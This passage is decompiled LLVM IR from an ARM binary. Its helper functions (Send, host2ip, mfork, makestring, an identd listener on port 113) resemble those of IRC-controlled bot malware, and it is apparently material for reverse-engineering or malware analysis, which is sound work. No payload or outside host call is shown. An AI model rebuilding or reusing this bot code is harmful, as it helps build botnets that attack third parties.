  %storemerge = phi i32 [ 1, %dec_label_pc_83b4 ], [ %.8, %dec_label_pc_83e4 ]
  br label %dec_label_pc_8428

dec_label_pc_8428:                                ; preds = %dec_label_pc_83a8, %dec_label_pc_8350, %dec_label_pc_82dc, %dec_label_pc_8420
  %stack_var_-48.0 = phi i32 [ %storemerge4, %dec_label_pc_8350 ], [ %storemerge3, %dec_label_pc_83a8 ], [ %v3_82e0, %dec_label_pc_82dc ], [ %storemerge, %dec_label_pc_8420 ]
  store i32 %v3_8294, i32* @r4, align 4
  store i32 %v6_8294, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8428, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8350, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8444 = load i32, i32* @fp, align 4
  %v4_8458 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_234c0.289 to i32), i32* @r0, align 4
  %v4_846c = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_234c0.289 to i32), i32 %arg2, i32 %v4_8458)
  %v3_8474 = call i32 @strlen(i8* bitcast (i8** @global_var_234c0.289 to i8*))
  %v4_8488 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_234c0.289 to i32), i32 %v3_8474)
  store i32 %v3_8444, i32* @fp, align 4
  ret i32 %v4_8488

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_234c0.289 to i32), { 1, 0, 2 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_84a8 = load i32, i32* @fp, align 4
  store i32 33968, i32* %stack_var_-4, align 4
  %v2_84ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_84ac, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_84c0 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_84c0, i32* @r2, align 4
  store i32 %v1_84c0, i32* @global_var_238c0.291, align 4
  %v3_84d8 = icmp eq i32 %v1_84c0, -1
  br i1 %v3_84d8, label %dec_label_pc_84e0, label %dec_label_pc_8528

dec_label_pc_84e0:                                ; preds = %entry
  %v3_84e0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_84e0, i32* @r0, align 4
  %v1_84e4 = call i32 @gethostbyname(i32 %v3_84e0)
  %v2_84f4 = icmp eq i32 %v1_84e4, 0
  br i1 %v2_84f4, label %dec_label_pc_84fc, label %dec_label_pc_8504

dec_label_pc_84fc:                                ; preds = %dec_label_pc_84e0
  %v1_8500 = call i32 @exit(i32 0)
  br label %dec_label_pc_8504

dec_label_pc_8504:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84fc
  %v1_8508 = add i32 %v1_84e4, 16
  %v2_8508 = inttoptr i32 %v1_8508 to i32*
  %v3_8508 = load i32, i32* %v2_8508, align 4
  %v1_850c = inttoptr i32 %v3_8508 to i32*
  %v2_850c = load i32, i32* %v1_850c, align 4
  %v1_8514 = add i32 %v1_84e4, 12
  %v2_8514 = inttoptr i32 %v1_8514 to i32*
  %v3_8514 = load i32, i32* %v2_8514, align 4
  store i32 %v3_8514, i32* @r2, align 4
  %v3_8524 = call i32 @bcopy(i32 %v2_850c, i32 ptrtoint (i32* @global_var_238c0.291 to i32), i32 %v3_8514)
  %v2_852c.pre = load i32, i32* @global_var_238c0.291, align 4
  br label %dec_label_pc_8528

dec_label_pc_8528:                                ; preds = %entry, %dec_label_pc_8504
  %v2_852c = phi i32 [ %v1_84c0, %entry ], [ %v2_852c.pre, %dec_label_pc_8504 ]
  store i32 %v3_84a8, i32* @fp, align 4
  ret i32 %v2_852c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_238c0.291, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8528, { 1, 0 }
  uselistorder label %dec_label_pc_8504, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8548 = load i32, i32* @fp, align 4
  store i32 34128, i32* %stack_var_-4, align 4
  %v2_854c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_854c, i32* @fp, align 4
  %v2_855c = load i8, i8* bitcast (i8** @global_var_234b0.293 to i8*), align 4
  %v7_8560 = icmp eq i8 %v2_855c, 1
  br i1 %v7_8560, label %dec_label_pc_8568, label %dec_label_pc_8574

dec_label_pc_8568:                                ; preds = %entry
  br label %dec_label_pc_8674

dec_label_pc_8574:                                ; preds = %entry
  %v0_8574 = call i32 @fork()
  %v2_8584 = icmp eq i32 %v0_8574, 0
  br i1 %v2_8584, label %dec_label_pc_858c, label %dec_label_pc_8598

dec_label_pc_858c:                                ; preds = %dec_label_pc_8574
  br label %dec_label_pc_8674

dec_label_pc_8598:                                ; preds = %dec_label_pc_8574
  %v2_859c = load i32, i32* @global_var_234bc.295, align 4
  %v1_85a0 = add i32 %v2_859c, 1
  store i32 %v1_85a0, i32* @global_var_234bc.295, align 4
  %tmp = mul i32 %v2_859c, 4
  %v3_85b8 = add i32 %tmp, 8
  store i32 %v3_85b8, i32* @r0, align 4
  %v0_85c0 = call i32 @malloc()
  %v2_861c12 = load i32, i32* @global_var_234bc.295, align 4
  %v9_862814 = icmp eq i32 %v2_861c12, 1
  br i1 %v9_862814, label %dec_label_pc_8630, label %dec_label_pc_85d8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_8598, %dec_label_pc_85d8
  %storemerge116 = phi i32 [ %v1_8610, %dec_label_pc_85d8 ], [ 0, %dec_label_pc_8598 ]
  %v3_85dc = mul i32 %storemerge116, 4
  %v2_85e8 = add i32 %v3_85dc, %v0_85c0
  %v2_85fc = load i32, i32* @global_var_23e80.297, align 4
  %v2_8600 = add i32 %v2_85fc, %v3_85dc
  %v1_8604 = inttoptr i32 %v2_8600 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = inttoptr i32 %v2_85e8 to i32*
  store i32 %v2_8604, i32* %v2_8608, align 4
  %v1_8610 = add i32 %storemerge116, 1
  %v2_861c = load i32, i32* @global_var_234bc.295, align 4
  %v1_8620 = add i32 %v2_861c, -1
  %tmp25 = icmp ugt i32 %v1_8620, %v1_8610
  br i1 %tmp25, label %dec_label_pc_85d8, label %dec_label_pc_8618.dec_label_pc_8630_crit_edge

dec_label_pc_8618.dec_label_pc_8630_crit_edge:    ; preds = %dec_label_pc_85d8
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8598, %dec_label_pc_8618.dec_label_pc_8630_crit_edge
  %v2_861c.lcssa = phi i32 [ %v2_861c, %dec_label_pc_8618.dec_label_pc_8630_crit_edge ], [ %v2_861c12, %dec_label_pc_8598 ]
  %v1_8634 = add i32 %v0_85c0, -4
  %v3_8640 = mul i32 %v2_861c.lcssa, 4
  %v2_8644 = add i32 %v1_8634, %v3_8640
  store i32 %v2_8644, i32* @r2, align 4
  %v2_864c = inttoptr i32 %v2_8644 to i32*
  store i32 %v0_8574, i32* %v2_864c, align 4
  %v2_8654 = load i32, i32* @global_var_23e80.297, align 4
  %v1_865c = call i32 @free(i32 %v2_8654)
  store i32 ptrtoint (i32* @global_var_23e80.297 to i32), i32* @r2, align 4
  store i32 %v0_85c0, i32* @global_var_23e80.297, align 4
  br label %dec_label_pc_8674

dec_label_pc_8674:                                ; preds = %dec_label_pc_858c, %dec_label_pc_8568, %dec_label_pc_8630
  %v3_8674 = phi i32 [ 0, %dec_label_pc_858c ], [ 1, %dec_label_pc_8568 ], [ %v0_8574, %dec_label_pc_8630 ]
  store i32 %v3_8548, i32* @fp, align 4
  ret i32 %v3_8674

; uselistorder directives
  uselistorder i32 %v3_85dc, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_861c12, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8674, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8630, { 1, 0 }
  uselistorder label %dec_label_pc_85d8, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_8694 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8694, i32* @ip, align 4
  %v1_86d0 = add i32 %tmp, -1
  br label %dec_label_pc_86cc

dec_label_pc_86ac:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_86cc
  %v3_86b8 = call i32 @strlen(i8* %arg1)
  %v2_86c0 = add i32 %v1_86d0, %v3_86b8
  %v3_86c8 = inttoptr i32 %v2_86c0 to i8*
  store i8 0, i8* %v3_86c8, align 1
  br label %dec_label_pc_86cc

dec_label_pc_86cc:                                ; preds = %entry, %dec_label_pc_86ac
  %v3_86d8 = call i32 @strlen(i8* %arg1)
  %v2_86e0 = add i32 %v1_86d0, %v3_86d8
  %v1_86e4 = inttoptr i32 %v2_86e0 to i8*
  %v2_86e4 = load i8, i8* %v1_86e4, align 1
  %v7_86e8 = icmp eq i8 %v2_86e4, 13
  br i1 %v7_86e8, label %dec_label_pc_86ac, label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86cc
  %v3_86fc = call i32 @strlen(i8* %arg1)
  %v2_8704 = add i32 %v1_86d0, %v3_86fc
  %v1_8708 = inttoptr i32 %v2_8704 to i8*
  %v2_8708 = load i8, i8* %v1_8708, align 1
  %v7_870c = icmp eq i8 %v2_8708, 10
  br i1 %v7_870c, label %dec_label_pc_86ac, label %dec_label_pc_8714

dec_label_pc_8714:                                ; preds = %dec_label_pc_86f0
  ret i32 %v3_86fc

; uselistorder directives
  uselistorder i32 %v1_86d0, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_86cc, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8724 = load i32, i32* @r4, align 4
  %v6_8724 = load i32, i32* @fp, align 4
  store i32 34604, i32* %stack_var_-4, align 4
  %v2_8728 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8728, i32* @fp, align 4
  %v0_8734 = call i32 @rand()
  %v2_874c = srem i32 %v0_8734, 5
  %v1_8770 = add nsw i32 %v2_874c, 4
  %v1_877c = add nsw i32 %v2_874c, 5
  store i32 %v1_877c, i32* @r0, align 4
  %v0_8784 = call i32 @malloc()
  store i32 %v0_8784, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v1_877c, i32* @r2, align 4
  %v0_87a4 = call i32 @memset()
  %v4_87b0 = call i32 @fopen(i32 ptrtoint ([16 x i8]* @global_var_19a84.300 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19a94.302, i32 0, i32 0))
  %v2_87c0 = icmp eq i32 %v4_87b0, 0
  br i1 %v2_87c0, label %dec_label_pc_8848.preheader, label %dec_label_pc_885c

dec_label_pc_8848.preheader:                      ; preds = %entry
  %v2_885024 = sub nsw i32 -4, %v2_874c
  %v6_885026 = and i32 %v2_885024, %v1_8770
  %v7_885027 = icmp slt i32 %v6_885026, 0
  %v8_885028 = icmp slt i32 %v2_885024, 0
  %v2_885430 = xor i1 %v8_885028, %v7_885027
  br i1 %v2_885430, label %dec_label_pc_87d4, label %dec_label_pc_8988

dec_label_pc_87d4:                                ; preds = %dec_label_pc_8848.preheader, %dec_label_pc_87d4
  %storemerge331 = phi i32 [ %v1_8840, %dec_label_pc_87d4 ], [ 0, %dec_label_pc_8848.preheader ]
  %v2_87e0 = add i32 %storemerge331, %v0_8784
  %v0_87e4 = call i32 @rand()
  %v2_87fc = srem i32 %v0_87e4, 26
  %fold = add nsw i32 %v2_87fc, 65
  %v1_8838 = trunc i32 %fold to i8
  %v3_8838 = inttoptr i32 %v2_87e0 to i8*
  store i8 %v1_8838, i8* %v3_8838, align 1
  %v1_8840 = add i32 %storemerge331, 1
  %v2_8850 = sub i32 %v1_8840, %v1_8770
  %v4_8850 = xor i32 %v1_8840, %v1_8770
  %v5_8850 = xor i32 %v2_8850, %v1_8840
  %v6_8850 = and i32 %v5_8850, %v4_8850
  %v7_8850 = icmp slt i32 %v6_8850, 0
  %v8_8850 = icmp slt i32 %v2_8850, 0
  %v2_8854 = xor i1 %v8_8850, %v7_8850
  br i1 %v2_8854, label %dec_label_pc_87d4, label %dec_label_pc_8988

dec_label_pc_885c:                                ; preds = %entry
  %v0_885c = call i32 @rand()
  store i32 %v0_885c, i32* @r4, align 4
  %v0_8864 = call i32 @rand()
  %v1_886c = load i32, i32* @r4, align 4
  %v2_886c = mul i32 %v1_886c, %v0_8864
  %v2_8884 = sdiv i32 %v2_886c, 12039
  %tmp23 = mul i32 %v2_8884, -45402
  %v2_88c0 = add i32 %tmp23, %v2_886c
  %v1_88cc = add i32 %v2_88c0, 1
  %v2_88e8 = ptrtoint i32* %stack_var_-1072 to i32
  %v3_88f8 = bitcast i32* %stack_var_-1072 to i8*
  br label %dec_label_pc_8908

dec_label_pc_88e0:                                ; preds = %dec_label_pc_8908
  %v4_88f8 = call i32 @fgets(i8* %v3_88f8, i32 1024, i32 %v4_87b0)
  %v1_8900 = add i32 %storemerge2, 1
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_885c, %dec_label_pc_88e0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_885c ], [ %v1_8900, %dec_label_pc_88e0 ]
  %v2_8910 = sub i32 %storemerge2, %v1_88cc
  %v4_8910 = xor i32 %storemerge2, %v1_88cc
  %v5_8910 = xor i32 %v2_8910, %storemerge2
  %v6_8910 = and i32 %v5_8910, %v4_8910
  %v7_8910 = icmp slt i32 %v6_8910, 0
  %v8_8910 = icmp slt i32 %v2_8910, 0
  %v2_8914 = xor i1 %v8_8910, %v7_8910
  store i32 %v2_88e8, i32* @r0, align 4
  br i1 %v2_8914, label %dec_label_pc_88e0, label %dec_label_pc_8918

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_8930 = call i32 @memset()
  %v4_894c = call i32 @fgets(i8* %v3_88f8, i32 1024, i32 %v4_87b0)
  %v2_8960 = call i32 @filter(i8* %v3_88f8)
  store i32 %v2_88e8, i32* @r3, align 4
  %v3_897c = inttoptr i32 %v0_8784 to i16*
  %v4_897c = call i32 @memcpy(i16* %v3_897c, i32 %v2_88e8, i32 %v1_8770)
  %v1_8984 = inttoptr i32 %v4_87b0 to i32*
  %v2_8984 = call i32 @fclose(i32* %v1_8984)
  br label %dec_label_pc_8988

dec_label_pc_8988:                                ; preds = %dec_label_pc_8848.preheader, %dec_label_pc_87d4, %dec_label_pc_8918
  store i32 %v3_8724, i32* @r4, align 4
  store i32 %v6_8724, i32* @fp, align 4
  ret i32 %v0_8784

; uselistorder directives
  uselistorder i32 %v2_8910, { 1, 0 }
  uselistorder i32 %storemerge2, { 0, 1, 3, 2 }
  uselistorder i8* %v3_88f8, { 1, 0, 2 }
  uselistorder i32 %v2_886c, { 1, 0 }
  uselistorder i32 %v2_8850, { 1, 0 }
  uselistorder i32 %v1_8840, { 3, 2, 1, 0 }
  uselistorder i32 %v2_885024, { 1, 0 }
  uselistorder i32 %v0_8784, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8770, { 2, 1, 3, 0 }
  uselistorder i32 %v2_874c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8988, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
  uselistorder label %dec_label_pc_87d4, { 1, 0 }
}

define i32 @"$d.18"(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_899c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_899c = load i1, i1* @cpsr_v, align 1
  br i1 %v0_899c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_899c
  %v1_899c = load i32, i32* @r6, align 4
  %v2_899c = trunc i32 %v1_899c to i8
  %v4_899c = inttoptr i32 %v1_899c to i8*
  store i8 %v2_899c, i8* %v4_899c, align 1
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_899c, %bb
  %v0_89a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_89a0, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  %v2_89a0 = load i32, i32* @r4, align 4
  %v2_89a4 = load i32, i32* @sl, align 4
  %v3_89a4 = mul i32 %v2_89a4, %v2_89a0
  store i32 %v3_89a4, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  %v0_89ac = load i1, i1* @cpsr_n, align 1
  %v1_89ac = load i1, i1* @cpsr_v, align 1
  %v2_89ac = xor i1 %v0_89ac, %v1_89ac
  br i1 %v2_89ac, label %bb3, label %bb4

bb3:                                              ; preds = %.thread
  store i32 %arg1, i32* %arg3, align 4
  %v6_89ac = add i32 %tmp, 4
  %v7_89ac = inttoptr i32 %v6_89ac to i32*
  %v8_89ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_89ac, i32* %v7_89ac, align 4
  %v9_89ac = add i32 %tmp, 8
  %v10_89ac = inttoptr i32 %v9_89ac to i32*
  store i32 %tmp, i32* %v10_89ac, align 4
  %v12_89ac = add i32 %tmp, 12
  %v13_89ac = inttoptr i32 %v12_89ac to i32*
  %v14_89ac = load i32, i32* @r4, align 4
  store i32 %v14_89ac, i32* %v13_89ac, align 4
  %v15_89ac = add i32 %tmp, 16
  %v16_89ac = inttoptr i32 %v15_89ac to i32*
  %v17_89ac = load i32, i32* @r5, align 4
  store i32 %v17_89ac, i32* %v16_89ac, align 4
  %v18_89ac = add i32 %tmp, 20
  %v19_89ac = inttoptr i32 %v18_89ac to i32*
  %v20_89ac = load i32, i32* @r6, align 4
  store i32 %v20_89ac, i32* %v19_89ac, align 4
  %v21_89ac = add i32 %tmp, 24
  %v22_89ac = inttoptr i32 %v21_89ac to i32*
  %v23_89ac = load i32, i32* @r8, align 4
  store i32 %v23_89ac, i32* %v22_89ac, align 4
  %v24_89ac = add i32 %tmp, 28
  %v25_89ac = inttoptr i32 %v24_89ac to i32*
  %v26_89ac = load i32, i32* @ip, align 4
  store i32 %v26_89ac, i32* %v25_89ac, align 4
  %v27_89ac = add i32 %tmp, 32
  %v28_89ac = inttoptr i32 %v27_89ac to i32*
  %v29_89ac = load i32, i32* @lr, align 4
  store i32 %v29_89ac, i32* %v28_89ac, align 4
  br label %bb4

bb4:                                              ; preds = %.thread, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @identd(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_89b4 = load i32, i32* @fp, align 4
  store i32 %v3_89b4, i32* %stack_var_-16, align 4
  store i32 35260, i32* %stack_var_-4, align 4
  %v13_89b4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_89b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_89b8, i32* @fp, align 4
  %v3_89cc = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_89dc = icmp eq i32 %v3_89cc, -1
  br i1 %v7_89dc, label %dec_label_pc_8d70, label %dec_label_pc_89e4

dec_label_pc_89e4:                                ; preds = %entry
  store i32 2, i32* %stack_var_-60, align 4
  %v1_89f0 = call i32 @htons(i32 113)
  %v2_8a08 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8a08, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_8a18 = call i32 @memset()
  %v2_8a1c = ptrtoint i32* %stack_var_-60 to i32
  store i32 16, i32* @r2, align 4
  %v3_8a2c = call i32 @bind(i32 %v3_89cc, i32 %v2_8a1c, i32 16)
  %v7_8a34 = icmp eq i32 %v3_8a2c, -1
  br i1 %v7_8a34, label %dec_label_pc_8d70, label %dec_label_pc_8a3c

dec_label_pc_8a3c:                                ; preds = %dec_label_pc_89e4
  store i32 %v3_89cc, i32* @r0, align 4
  %v2_8a44 = call i32 @listen(i32 %v3_89cc, i32 1)
  %v7_8a4c = icmp eq i32 %v2_8a44, -1
  br i1 %v7_8a4c, label %dec_label_pc_8d70, label %dec_label_pc_8a54

dec_label_pc_8a54:                                ; preds = %dec_label_pc_8a3c
  %v0_8a54 = call i32 @fork()
  %v2_8a5c = icmp eq i32 %v0_8a54, 0
  br i1 %v2_8a5c, label %dec_label_pc_8d70, label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_8a54
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8a6c = ptrtoint i32* %stack_var_-76 to i32
  %v2_8a70 = ptrtoint i32* %stack_var_-44 to i32
  %v5_8a7c = call i32 @accept(i32 %v3_89cc, i32 %v2_8a6c, i32 %v2_8a70, i32 %v2_8a6c, i32 16)
  %v2_8a8c = add i32 %v5_8a7c, 1
  %v3_8a8c = icmp eq i32 %v5_8a7c, -1
  br i1 %v3_8a8c, label %dec_label_pc_8a94, label %dec_label_pc_8a9c.preheader

dec_label_pc_8a94:                                ; preds = %dec_label_pc_8a64
  %v1_8a98 = call i32 @exit(i32 0)
  br label %dec_label_pc_8a9c.preheader

dec_label_pc_8a9c.preheader:                      ; preds = %dec_label_pc_8a94, %dec_label_pc_8a64
  %v2_8aa4 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8aec = udiv i32 %v5_8a7c, 32
  %v3_8b00 = mul nuw nsw i32 %v3_8aec, 4
  %v2_8b08 = add i32 %v3_8b00, %v13_89b4
  %v1_8b18 = urem i32 %v5_8a7c, 32
  %v6_8b20 = shl i32 1, %v1_8b18
  %v2_8b70 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8bbc = add i32 %v2_8b08, -1220
  %v1_8bc0 = inttoptr i32 %v2_8bbc to i32*
  br label %dec_label_pc_8a9c

dec_label_pc_8a9c:                                ; preds = %dec_label_pc_8a9c.preheader, %dec_label_pc_8ba0
  br label %dec_label_pc_8ab8

dec_label_pc_8ab8:                                ; preds = %dec_label_pc_8a9c, %dec_label_pc_8ab8
  %storemerge13 = phi i32 [ 32, %dec_label_pc_8a9c ], [ %v1_8ad4, %dec_label_pc_8ab8 ]
  %stack_var_-20.02 = phi i32 [ %v2_8aa4, %dec_label_pc_8a9c ], [ %v1_8ac8, %dec_label_pc_8ab8 ]
  %v2_8ac0 = inttoptr i32 %stack_var_-20.02 to i32*
  store i32 0, i32* %v2_8ac0, align 4
  %v1_8ac8 = add i32 %stack_var_-20.02, 4
  %v1_8ad4 = add nsw i32 %storemerge13, -1
  %v2_8ae0 = icmp eq i32 %v1_8ad4, 0
  br i1 %v2_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8ab8

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ab8
  %v2_8b10 = load i32, i32* %v1_8bc0, align 4
  %v2_8b24 = or i32 %v2_8b10, %v6_8b20
  store i32 %v2_8b24, i32* %v1_8bc0, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8b88 = call i32 @select(i32 %v2_8a8c, i32 %v2_8aa4, i32 0, i32 0, i32 %v2_8b70)
  %v1_8b90 = icmp slt i32 %v5_8b88, 0
  br i1 %v1_8b90, label %dec_label_pc_8b98, label %dec_label_pc_8ba0

dec_label_pc_8b98:                                ; preds = %dec_label_pc_8ae8
  %v1_8b9c = call i32 @exit(i32 0)
  br label %dec_label_pc_8ba0

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8ae8, %dec_label_pc_8b98
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v6_8bcc = lshr i32 %v2_8bc0, %v1_8b18
  %v1_8bd0 = urem i32 %v6_8bcc, 2
  %v2_8bd4 = icmp eq i32 %v1_8bd0, 0
  br i1 %v2_8bd4, label %dec_label_pc_8a9c, label %dec_label_pc_8be0

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8ba0
  %v2_8be8 = ptrtoint i32* %stack_var_-1100 to i32
  store i32 %v5_8a7c, i32* @r0, align 4
  store i32 %v2_8be8, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_8bfc = call i32 @recv(i32 %v5_8a7c, i32 %v2_8be8, i32 1024, i32 0)
  %tmp30 = icmp slt i32 %v4_8bfc, 1
  br i1 %tmp30, label %dec_label_pc_8c20, label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8be0
  %v7_8c1c = icmp slt i32 %v4_8bfc, 20
  br i1 %v7_8c1c, label %dec_label_pc_8c28, label %dec_label_pc_8c20

dec_label_pc_8c20:                                ; preds = %dec_label_pc_8c14, %dec_label_pc_8be0
  %v1_8c24 = call i32 @exit(i32 0)
  br label %dec_label_pc_8c28

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8c14, %dec_label_pc_8c20
  %v2_8c38 = add i32 %v13_89b4, -1084
  %v2_8c3c = add i32 %v2_8c38, %v4_8bfc
  %v3_8c44 = inttoptr i32 %v2_8c3c to i8*
  store i8 0, i8* %v3_8c44, align 1
  %v1_8c4c = add i32 %v13_89b4, -1
  %v2_8c5c = add i32 %v1_8c4c, %v4_8bfc
  %v2_8c60 = add i32 %v2_8c5c, -1084
  %v1_8c64 = inttoptr i32 %v2_8c60 to i8*
  %v2_8c64 = load i8, i8* %v1_8c64, align 1
  %v7_8c68 = icmp eq i8 %v2_8c64, 10
  br i1 %v7_8c68, label %dec_label_pc_8c98, label %dec_label_pc_8c70

dec_label_pc_8c70:                                ; preds = %dec_label_pc_8c28
  %v2_8c8c = load i8, i8* %v1_8c64, align 1
  %v7_8c90 = icmp eq i8 %v2_8c8c, 13
  br i1 %v7_8c90, label %dec_label_pc_8c98, label %dec_label_pc_8cbc

dec_label_pc_8c98:                                ; preds = %dec_label_pc_8c70, %dec_label_pc_8c28
  store i8 0, i8* %v1_8c64, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8c70, %dec_label_pc_8c98
  %v1_8cc0 = add i32 %v13_89b4, -2
  %v2_8cd0 = add i32 %v1_8cc0, %v4_8bfc
  %v2_8cd4 = add i32 %v2_8cd0, -1084
  %v1_8cd8 = inttoptr i32 %v2_8cd4 to i8*
  %v2_8cd8 = load i8, i8* %v1_8cd8, align 1
  %v7_8cdc = icmp eq i8 %v2_8cd8, 10
  br i1 %v7_8cdc, label %dec_label_pc_8d0c, label %dec_label_pc_8ce4

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_8cbc
  %v2_8d00 = load i8, i8* %v1_8cd8, align 1
  %v7_8d04 = icmp eq i8 %v2_8d00, 13
  br i1 %v7_8d04, label %dec_label_pc_8d0c, label %dec_label_pc_8d30

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8ce4, %dec_label_pc_8cbc
  store i8 0, i8* %v1_8cd8, align 1
  br label %dec_label_pc_8d30

dec_label_pc_8d30:                                ; preds = %dec_label_pc_8ce4, %dec_label_pc_8d0c
  %v4_8d54 = call i32 @Send(i32 %v5_8a7c, i32 ptrtoint ([25 x i8]* @global_var_19a98.308 to i32), i32 %v2_8be8)
  %v1_8d5c = call i32 @close(i32 %v5_8a7c)
  %v1_8d64 = call i32 @close(i32 %v3_89cc)
  %v1_8d6c = call i32 @exit(i32 0)
  br label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %dec_label_pc_8a54, %dec_label_pc_8a3c, %dec_label_pc_89e4, %entry, %dec_label_pc_8d30
  %v1_8d78 = phi i32 [ 0, %dec_label_pc_8a54 ], [ %v2_8a44, %dec_label_pc_8a3c ], [ %v3_8a2c, %dec_label_pc_89e4 ], [ %v3_89cc, %entry ], [ %v1_8d6c, %dec_label_pc_8d30 ]
  ret i32 %v1_8d78

; uselistorder directives
  uselistorder i8* %v1_8cd8, { 1, 0, 2 }
  uselistorder i8* %v1_8c64, { 1, 0, 2 }
  uselistorder i32 %v2_8be8, { 0, 2, 1 }
  uselistorder i32 %stack_var_-20.02, { 1, 0 }
  uselistorder i32* %v1_8bc0, { 2, 0, 1 }
